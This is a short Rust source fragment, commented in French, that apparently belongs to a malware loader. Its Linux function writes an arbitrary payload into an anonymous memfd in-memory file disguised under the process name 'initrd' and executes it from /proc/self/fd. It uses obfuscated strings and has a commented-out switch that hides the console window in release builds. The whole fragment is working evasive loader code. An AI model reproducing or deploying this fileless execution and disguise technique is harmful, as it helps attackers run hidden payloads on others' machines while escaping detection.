// #![windows_subsystem = "windows"] // Décommenter pour la release (Mode GUI)
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use std::env;
use std::fs::File;
use std::io::Read;
use std::process::exit;
use std::ptr;
use obfstr::obfstr;

// =============================================================
// LINUX: MEMFD EXECUTION
// =============================================================
#[cfg(target_os = "linux")]
pub fn linux_mem_exec(payload: Vec<u8>) {
    use std::os::unix::io::FromRawFd;
    use std::ffi::CString;
    use std::io::Write;
    use std::process::Command;
    unsafe {
        // Nom du process furtif
        let name = CString::new(obfstr!("initrd")).unwrap();
        let fd = libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC);
        if fd < 0 { return; }
        
        let mut file = File::from_raw_fd(fd);
        file.write_all(&payload).unwrap();
        
        let path = format!("{}/{}", obfstr!("/proc/self/fd"), fd);
        let args: Vec<String> = env::args().skip(1).collect();
        
        Command::new(path).args(&args).status().ok();
    }
}